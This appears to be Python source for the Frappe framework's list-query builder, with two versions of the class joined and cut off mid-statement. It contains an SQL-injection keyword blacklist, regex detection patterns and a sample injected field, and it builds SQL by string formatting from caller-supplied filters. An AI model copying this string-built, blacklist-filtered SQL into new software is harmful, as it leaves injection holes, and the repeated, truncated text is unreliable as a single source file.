		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)                    

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',                    
			'from', 'group', 'order', 'by']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
